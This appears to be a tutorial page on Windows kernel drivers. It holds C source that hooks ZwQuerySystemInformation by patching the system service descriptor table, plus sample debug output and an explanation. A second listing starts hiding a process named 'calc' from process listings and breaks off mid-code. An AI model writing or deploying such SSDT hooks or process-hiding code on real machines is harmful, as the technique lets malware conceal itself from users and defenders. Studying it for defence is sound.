<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>CreateTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>UserTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>KernelTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING<span
style="mso-spacerun: yes">  </span>ProcessName;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KPRIORITY<span
style="mso-spacerun: yes">       </span>BasePriority;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>ProcessId;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>InheritedFromProcessId;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>HandleCount;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>Reserved2[2];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VM_COUNTERS<span
style="mso-spacerun: yes">     </span>VmCounters;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IO_COUNTERS<span
style="mso-spacerun: yes">     </span>IoCounters; <o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
_SYSTEM_THREADS<span style="mso-spacerun: yes">  </span>Threads[1];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>};<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
NewZwQuerySystemInformation(ULONG SystemInformationClass,PVOID SystemInformation,ULONG
SystemInformationLength,PULONG ReturnLength)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS rc;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc =
OldZwQuerySystemInformation(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(rc == 0 &amp;&amp;
5 == SystemInformationClass)<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
_SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while(curr-&gt;
NextEntryDelta != 0)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<span
style="mso-spacerun: yes">       </span><o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int i;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
_SYSTEM_THREADS *t;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%S
curr=%x Delta=%d pid=%d Inherited=%d
Threads=%d&quot;,curr-&gt;ProcessName.Buffer,curr,curr-&gt;NextEntryDelta,curr-&gt;ProcessId,curr-&gt;InheritedFromProcessId,curr-&gt;ThreadCount);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Virtual
Size=%d Page Faults=%d Reads=%d
handles=%d&quot;,curr-&gt;VmCounters.VirtualSize,curr-&gt;VmCounters.PageFaultCount,curr-&gt;IoCounters.ReadOperationCount,curr-&gt;HandleCount);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>t = (struct
_SYSTEM_THREADS *)&amp;curr-&gt;Threads;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(i = 0 ; i &lt;
curr-&gt;ThreadCount ; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Thread
no=%d t=%x Process=%d ThreadID=%d Priority=%d %d
ContextSwitchCount=%d&quot;,i,t,t-&gt;ClientIs.UniqueProcess,t-&gt;ClientIs.UniqueThread,t-&gt;Priority,t-&gt;BasePriority,t-&gt;ContextSwitchCount);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>t++;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>curr = (struct
_SYSTEM_PROCESSES *)((char *)curr + curr-&gt;NextEntryDelta);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return rc;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long no;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm cli<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)OldZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm sti<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char *p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
2 KeServiceDescriptorTable=%x&quot;,KeServiceDescriptorTable);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = (char *)ZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = p + 1;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>no = *(long *)p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>OldZwQuerySystemInformation=(qtype)KeServiceDescriptorTable.ServiceTableBase[no];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm cli<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)NewZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm sti<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>notepad.exe
curr=785e30 Delta=400 pid=1404 Inherited=300 Threads=3<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Virtual
Size=25141248 Page Faults=1693 Reads=78 handles=0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thread
no=0 t=785ee8 Process=1404 ThreadID=1160 Priority=10 8 ContextSwitchCount=8566<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thread
no=1 t=785f28 Process=1404 ThreadID=736 Priority=8 8 ContextSwitchCount=2<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thread
no=2 t=785f68 Process=1404 ThreadID=1200 Priority=8 8 ContextSwitchCount=229<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoBodyText style='tab-stops:.5in;mso-layout-grid-align:auto;
text-autospace:ideograph-other'><span style='mso-bidi-font-size:8.0pt;
mso-bidi-font-family:"Times New Roman"'>Lets start by telling you some basics.
The windows task manager displays all the programs running on our system. This
is program written by some smart programmer at Microsoft. There are documented
functions that return all the programs running on the machine. Its either that
these functions finally end up calling the function ZwQuerySystemInformation or
this guy used ZwQuerySystemInformation. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Mind
you Microsoft does not document this function at all. Thus each time
ZwQuerySystemInformation gets called the first parameter tells us what
information the caller wanted. If the value is 5, we want a list of all
processes and threads running. Thus we first call the original
ZwQuerySystemInformation and then check if the return value is 0. If not zero,
there is another reason why this function has been called which we will explain
later. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
Second parameter is a pointer to a structure and the third and fourth length
values that we will not use. In our case the second parameter is a pointer to a
structure that looks like _SYSTEM_PROCESSES. This structure is not documented
by us but we found it at lots of places on the net. Wonder<span
style="mso-spacerun: yes">  </span>why Microsoft yet calls it undocumented. The
first parameter NextEntryDelta points to a similar such structure and if its
value is 0, it means that this is the last process. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
we have a while loop that keeps going on until this first member is non zero.
We display some half a dozen of its members and check with task manager whether
we both get the same answers. Some members like VmCounters are actual
structures whose data type is there in the header files. We compile with the /P
option and then search the .i file created for the structure tags. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
last parameter is a series of structures for the number of threads this process
has created. Thus if we have 10 threads, we have 10 thread structures running
back to back. So we have set a variable t to the start of the first structure
and then increase it by 1 each time to point to the next thread structure. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
is how we print out the structure members. The point is that the first structure
does not contain a actual pointer to the second process structure but an offset
in bytes. This is why at the end we have to cast the variable curr to a char *.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P44<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSYSAPI NTSTATUS
NTAPI ZwQuerySystemInformation(ULONG SystemInformationClass,PVOID
SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef struct <o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
*ServiceTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
*ServiceCounterTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
NumberOfServices;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned char *ParamTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>} sdt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__declspec(dllimport)
sdt KeServiceDescriptorTable;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef NTSTATUS
(*qtype)(ULONG SystemInformationCLass,PVOID SystemInformation,ULONG
SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>qtype
OldZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct _SYSTEM_PROCESSES<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>NextEntryDelta;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>ThreadCount;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>Reserved[6];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>CreateTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>UserTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>KernelTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING<span
style="mso-spacerun: yes">  </span>ProcessName;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>};<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS NewZwQuerySystemInformation(ULONG
SystemInformationClass,PVOID SystemInformation,ULONG
SystemInformationLength,PULONG ReturnLength)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS rc;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc =
OldZwQuerySystemInformation(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(rc == 0 &amp;&amp;
5 == SystemInformationClass)<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
_SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
_SYSTEM_PROCESSES *prev = NULL;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while(1)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<span
style="mso-spacerun: yes">       </span><o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ANSI_STRING
process_name;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlUnicodeStringToAnsiString
(&amp;process_name,&amp;curr-&gt;ProcessName,TRUE);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%s
curr=%x prev=%x
Delta=%d&quot;,process_name.Buffer,curr,prev,curr-&gt;NextEntryDelta);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(strnicmp(process_name.Buffer,&quot;calc&quot;,4)
== 0)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(curr-&gt;NextEntryDelta
!= 0 &amp;&amp; prev != 0) //first guy has no name<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Between
%s curr-&gt;NextEntryDelta=%x
